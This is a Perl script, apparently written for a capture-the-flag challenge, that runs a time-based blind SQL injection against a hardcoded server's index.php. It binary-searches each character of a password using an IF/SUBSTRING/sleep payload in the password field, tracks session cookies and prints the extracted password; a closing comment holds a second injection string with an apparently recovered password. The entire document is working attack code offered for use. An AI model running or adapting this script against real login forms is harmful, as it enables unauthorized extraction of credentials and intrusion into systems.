#!/usr/bin/perl
use HTTP::Request::Common;
use LWP::UserAgent;
use HTTP::Request;
use Time::HiRes qw /time/;

$url = "http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/index.php";
$browser = LWP::UserAgent->new;
$pass = "";
$length = 30;
@chars = split("", "abcdefghijklmnopqrstuvwxyz");
$delay = 3;
my $cookie = "";

$query = "' or IF(ASCII(SUBSTRING(password, %d, 1))<ASCII('%s'), sleep($delay), IF(ASCII(SUBSTRING(password, %d, 1))=ASCII('%s'), '1', '0'))='1";
my $try=0;
for (my $i=1; $i<=$length; $i++)
{
	my $l=0;
	my $u=25;
	my $mid = 0;
	while($l<$u)
	{
		$mid = ($u+$l)/2;
		$request = POST $url,
		Content => [
			password => sprintf($query, $i, $chars[$mid], $i, $chars[$mid]),
		];
		$request->header(Cookie => $cookie);
		$start = time;
		$response = $browser->request($request);
		$try++;
		if(try>120)
		{
			print "FAILED TRY AGAIN\n";
			last;
		}
		if($response->header('set-cookie'))
		{
			$cookie=$response->header('set-cookie');
			print $cookie."\n";
		}
		
		$res = $response->content;
		$end = time;
		
		#print $res."\n";
		#printf($query, $i, $chars[$mid], $i, $chars[$mid]);
		#print "\n";
		print "Try: $try -- ";
		print ($end-$start);
		print "\n";
		
		if($res=~/true/i)
		{
			last;
		}
		elsif(($end-$start)>2*$delay)
		{
			print "SERVER TIMEDOUT TRY AGAIN\n";
			last;
		}
		elsif(($end-$start)>$delay)
		{
			$u = $mid-1;
		}
		else
		{
			$l = $mid;
		}
	}
	print "Found ".$chars[$mid]." at ".$i." (%".$i*100/$try.")\n";
	$pass .= $chars[$mid];
	print $pass."\n";
}

print "Success: $pass\n";
print $cookie."\n";

#' or password like 'edxeedncenriusssfainhinrcwssel%
